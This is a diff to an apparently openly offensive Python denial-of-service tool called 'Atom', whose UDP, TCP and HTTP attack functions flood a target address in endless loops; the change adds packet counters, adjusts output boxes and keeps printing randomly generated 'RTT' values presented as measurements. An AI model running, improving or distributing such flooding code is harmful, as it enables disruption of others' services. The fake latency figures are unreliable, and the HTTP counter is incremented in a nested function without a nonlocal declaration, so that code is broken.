@@ -46,15 +46,17 @@ def run_udp_attack(target_ip, target_port, attack_speed):
 
     print(f"Starting: UDP Attack to: {target_ip}:{target_port}. Press Ctrl+C to stop!")
     time.sleep(2)
+    packet_count = 0
     try:    
         while True:
             try:
                 rtt = random.randint(10,100)
                 bytes_sent = sock.sendto(message, (target_ip, int(target_port)))
+                packet_count += 1
                 print(f""" {BLUE}
-┌───────────────────────────[Atom Output]──────────────────────────┐
-│                              {current_time}            
-│└─ Packet Sent to {target_ip}:{target_port},                          
+┌─────────────────────────[Atom Output]────────────────────────────┐
+│                           {current_time}            
+│└─ Packet Sent to {target_ip}:{target_port},                [Packet: {packet_count}]         
 │└─ Bytes: {bytes_sent} bytes [MAX], RTT: {rtt}ms,                 
 └──────────────────────────────────────────────────────────────────┘
 {RESET}""")
@@ -75,19 +77,21 @@ def run_tcp_attack(target_ip, target_port, attack_speed):
     message = b"A" * 1460
     print(f"Starting: TCP Attack to: {target_ip}:{target_port}. Press Ctrl+C to stop!")
     time.sleep(2)
+    packetcount = 0
     try:
         while True:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(2.0)  
             try:
+                packetcount += 1
                 start_time = time.time()
                 sock.connect((target_ip, int(target_port)))
                 bytes_sent = sock.send(message)
-                rtt = random.randint(10,1000)
+                rtt = random.randint(10,100)
                 print(f""" {BLUE}
-┌───────────────────────────[Atom Output]───────────────────────────────┐
-│                              {current_time}                                
-│└─ TCP Connection Established & Sent to {target_ip}:{target_port},     
+┌────────────────────[Atom Output]──────────────────────────────────────┐
+│                      {current_time}                                
+│└─ TCP Connection Established & Sent to {target_ip}:{target_port},   [Packet: {packetcount}]
 │└─ Bytes: {bytes_sent} bytes [MAX], RTT: {rtt}ms,                      
 └───────────────────────────────────────────────────────────────────────┘
 {RESET}""")
@@ -106,17 +110,19 @@ def run_http_attack(method, target_url, attack_speed, thread_count):
 
     print(f"Starting HTTP Request Attack to {target_url}. Press ctrl c to stop!")
     time.sleep(2)
+    packetcounts = 0
     def attack():
         while True:
             try:
-                rt = random.randint(10,1000)
+                rt = random.randint(10,100)
                 response = manager.request(method, target_url, timeout=0.01)
+                packetcounts += 1
                 print(f""" {BLUE}
-┌────────────────────[Atom Output]─────────────────────┐
-│                       {current_time}                       
-│└─ Sent {method} Request Packet to {target_url},      
+┌───────────────────────[Atom Output]──────────────────────────┐
+│                        {current_time}                       
+│└─ Sent {method} Request Packet to {target_url},            [Packet: {packetcounts}]
 │└─ Status Code: {response.status}, RTT: {rt}ms,       
-└──────────────────────────────────────────────────────┘
+└──────────────────────────────────────────────────────────────┘
 {RESET}""")
             except Exception as exc:
                 print(f"{BLUE}[Atom Output]:{RESET} {method} request failed: {exc}")
